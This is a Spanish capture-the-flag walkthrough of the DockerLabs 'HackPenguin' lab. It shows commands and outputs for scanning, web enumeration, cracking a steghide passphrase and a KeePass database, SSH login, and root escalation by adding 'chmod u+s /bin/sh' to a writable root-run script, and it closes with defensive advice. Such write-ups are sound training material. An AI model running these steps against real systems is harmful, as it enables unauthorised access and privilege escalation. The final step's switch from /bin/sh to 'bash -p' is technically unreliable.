# HackPenguin — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 09/04/2024  
**Técnicas:** Gobuster · Steganography · Steghide · Keepass · JohnTheRipper · SSH · Writable Script · SUID abuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Steganografía — extracción de Keepass](#3-steganografía--extracción-de-keepass)
4. [Cracking Keepass y acceso SSH](#4-cracking-keepass-y-acceso-ssh)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh hackpenguin.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Servicios detectados:

```text
OpenSSH 8.9p1 Debian
Apache2 Ubuntu Default Page
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/index.html
/penguin.html
```

Exploramos:

```text
http://172.17.0.2/penguin.html
```

La página contiene una imagen de un pingüino aparentemente normal.

Descargamos la imagen:

```bash
wget http://172.17.0.2/penguin.jpg
```

Intentamos extraer contenido oculto:

```bash
steghide extract -sf penguin.jpg
```

Resultado:

```text
steghide: no pudo extraer ningún dato con ese salvoconducto
```

La imagen contiene datos ocultos protegidos mediante contraseña.

---

## 3. Steganografía — extracción de Keepass

Utilizamos `StegCracker` para realizar fuerza bruta:

```bash
stegcracker penguin.jpg /usr/share/wordlists/rockyou.txt
```

Resultado:

```text
Successfully cracked file with password: chocolate
```

Extraemos el contenido oculto:

```bash
steghide extract -sf penguin.jpg
```

Contraseña:

```text
chocolate
```

Resultado:

```text
wrote extracted data to "penguin.kdbx"
```

Obtenemos una base de datos Keepass.

Convertimos el hash utilizando `keepass2john`:

```bash
keepass2john penguin.kdbx > password.hash
```

Realizamos fuerza bruta con JohnTheRipper:

```bash
john password.hash
```

Resultado:

```text
qwerty
```

Abrimos la base de datos Keepass:

```bash
keepassxc penguin.kdbx
```

Contraseña:

```text
qwerty
```

Dentro encontramos credenciales SSH:

```text
Usuario: penguino
Contraseña: pinguinomaravilloso123
```

---

## 4. Cracking Keepass y acceso SSH

Accedemos mediante SSH:

```bash
ssh penguino@172.17.0.2
```

Contraseña:

```text
pinguinomaravilloso123
```

Acceso correcto.

Exploramos el directorio del usuario:

```bash
ls -la
```

Resultado relevante:

```text
script.sh
archivo.txt
```

Observamos que el script pertenece a root y es modificable.

Contenido original:

```bash
#!/bin/bash

echo 'pinguino no hackeable' > archivo.txt
```

---

## 5. Escalada de privilegios

Editamos el script:

```bash
nano script.sh
```

Añadimos:

```bash
chmod u+s /bin/sh
```

El contenido final:

```bash
#!/bin/bash

chmod u+s /bin/sh
echo 'pinguino no hackeable' > archivo.txt
```

Esperamos a que root ejecute el script automáticamente.

Verificamos permisos:

```bash
ls -la /bin/sh
```

Resultado:

```text
-rwsr-xr-x
```

Ejecutamos una shell preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Steganografía con contraseña débil | Filtración de información |
| Base de datos Keepass vulnerable | Descubrimiento de credenciales |
| Contraseña SSH reutilizada | Acceso inicial |
| Script editable ejecutado por root | Escalada de privilegios |
| Activación del bit SUID | Acceso persistente root |

**Para defenderse:**

- Utilizar contraseñas robustas en steganografía y Keepass.
- Restringir permisos sobre scripts ejecutados por root.
- No reutilizar contraseñas entre servicios.
- Auditar binarios SUID críticos.
- Aplicar principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
